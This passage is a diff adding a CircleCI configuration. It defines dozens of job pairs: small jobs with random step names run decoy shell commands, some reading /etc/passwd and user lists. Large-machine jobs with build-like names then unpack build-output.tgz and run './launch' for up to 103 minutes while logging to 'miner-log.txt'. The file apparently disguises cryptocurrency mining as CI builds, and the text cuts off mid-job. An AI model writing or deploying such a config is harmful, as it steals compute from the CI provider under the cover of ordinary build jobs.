@@ -1,0 +1,2027 @@
+version: 2.1
+
+jobs:
+  AllTheStates:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: asdf
+          command: |
+            mkdir -p /var/tmp/stage4
+            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "it-$((i*3))"; done > /var/tmp/stage4/GIF.Shimmer; true
+            echo "finalized $(wc -c </var/tmp/stage4/GIF.Shimmer)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'GIF.Shimmer'
+  edge-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/GIF.Shimmer 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  android-receipt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: tunneling wifi mesh now
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; sed 's/=.*//' /etc/os-release | nl | fold -w 21 | tr -cs '[:alnum:]' '\n'; true ; } > /var/tmp/stage4/44c5c-3913-ui
+            echo "finalized $(wc -c </var/tmp/stage4/44c5c-3913-ui)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '44c5c-3913-ui'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/44c5c-3913-ui 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  November:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Chapter 22 Caption The Hero Banner
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; mkdir -p "/dev/shm/se0" && chmod -R go-rwx "/dev/shm/se0" && ls -ld "/dev/shm/se0"; true ; } > /var/tmp/stage4/0r
+            echo "finalized $(wc -c </var/tmp/stage4/0r)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '0r'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  fc3e2c22-7543-da89-9a10-f0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Max 25 retries for clustering
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; echo 'hello from the shell'; true ; } > /var/tmp/stage4/TXN32869
+            echo "finalized $(wc -c </var/tmp/stage4/TXN32869)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'TXN32869'
+  Build_Prod1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  scale_full_disable_pipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Me captioning raw footage
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; cp -r /etc/skel ${TMPDIR:-/tmp}/model-20230728 && ls -A ${TMPDIR:-/tmp}/model-20230728; true ; } > /var/tmp/stage4/xx_3a18574
+            echo "finalized $(wc -c </var/tmp/stage4/xx_3a18574)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'xx_3a18574'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  label__action:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Forget batching
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; cp /etc/passwd ${TMPDIR:-/tmp}/chat_spider_refund.copy && sed -i 's/:x:/:*:/' ${TMPDIR:-/tmp}/chat_spider_refund.copy && cat ${TMPDIR:-/tmp}/chat_spider_refund.copy; true ; } > /var/tmp/stage4/boson959
+            echo "finalized $(wc -c </var/tmp/stage4/boson959)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'boson959'
+  d-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  COUPON_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Check the empty state is disabled
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/schedule.timesheet.kitchen" && cd "/tmp/schedule.timesheet.kitchen" && pwd; true ; } > /var/tmp/stage4/trade_l3dg3r
+            echo "finalized $(wc -c </var/tmp/stage4/trade_l3dg3r)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'trade_l3dg3r'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  resultsQueue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: DEFRAGMENT SLOW QUERY LOG COMPLETE
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; tar -cvzf '/tmp/sandbox.gamma.tar.gz' -C /etc profile; true ; } > /var/tmp/stage4/20201124
+            echo "finalized $(wc -c </var/tmp/stage4/20201124)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '20201124'
+  q3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/otterFilterLepton 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  blocksArray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Lima first then the west coast
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/volume.conf && sed -i -e '1i # managed by hand' /tmp/volume.conf && head -n 3 /tmp/volume.conf; true ; } > /var/tmp/stage4/18edf5b268fea1589e6c7f10d98eae9
+            echo "finalized $(wc -c </var/tmp/stage4/18edf5b268fea1589e6c7f10d98eae9)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '18edf5b268fea1589e6c7f10d98eae9'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/18edf5b268fea1589e6c7f10d98eae9 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  freddy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: open search box too
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; command grep -n -A 3 "HOME_URL" /etc/os-release | head -n 3; true ; } > /var/tmp/stage4/150f1b5e7a
+            echo "finalized $(wc -c </var/tmp/stage4/150f1b5e7a)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '150f1b5e7a'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  LS-DUE-B:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Retry maintenance mode or flush nightly window
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1 | sort -u | paste -s -d ' '; true ; } > /var/tmp/stage4/P-63764
+            echo "finalized $(wc -c </var/tmp/stage4/P-63764)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'P-63764'
+  BuildTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/P-63764 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  id35003:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Carry the parking passes home
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; date --date="last friday" +"%T"; true ; } > /var/tmp/stage4/otterFilterLepton
+            echo "finalized $(wc -c </var/tmp/stage4/otterFilterLepton)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'otterFilterLepton'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/otterFilterLepton 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  U:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Consume
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; echo 'name: demo'| gzip -c| wc -c; true ; } > /var/tmp/stage4/ux
+            echo "finalized $(wc -c </var/tmp/stage4/ux)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'ux'
+  yuki-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/ux 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  srcPct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Record petri dishes with fresh tips
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; compgen -k | pr -4 -t -w 80 | rev | tail -5; true ; } > /var/tmp/stage4/wmeNhTgH4zmQKsdBLlnB
+            echo "finalized $(wc -c </var/tmp/stage4/wmeNhTgH4zmQKsdBLlnB)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'wmeNhTgH4zmQKsdBLlnB'
+  perseus-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  facehardschedule:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Act VII retire the terms of service
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; find . -maxdepth 1 -type l -name '*.md' -size 0 -user $(id -un) -ls; true ; } > /var/tmp/stage4/REceipTferMIon
+            echo "finalized $(wc -c </var/tmp/stage4/REceipTferMIon)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'REceipTferMIon'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/REceipTferMIon 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  MAX_SOCKET_SIZE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: The mounted volume looks ok
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; find /proc/self -type f -mmin +60 -print0 2>/dev/null|xargs -0r stat -c %s|awk '{s+=$1} END {print s}'; true ; } > /var/tmp/stage4/run_967
+            echo "finalized $(wc -c </var/tmp/stage4/run_967)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'run_967'
+  bug-4916:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/run_967 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  decodeWithWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Seed The Fog Volumes Zone 7
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; tar -zcf "/dev/shm/bet1.tar.gz" -C /etc shells && tar -tf "/dev/shm/bet1.tar.gz"; true ; } > /var/tmp/stage4/kappaReefTensor
+            echo "finalized $(wc -c </var/tmp/stage4/kappaReefTensor)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'kappaReefTensor'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/kappaReefTensor 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  derp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Fine tune the base model int8
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; echo "snow expected tomorrow" | sed -n "s@snow@health@p"; true ; } > /var/tmp/stage4/access.log.18
+            echo "finalized $(wc -c </var/tmp/stage4/access.log.18)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'access.log.18'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
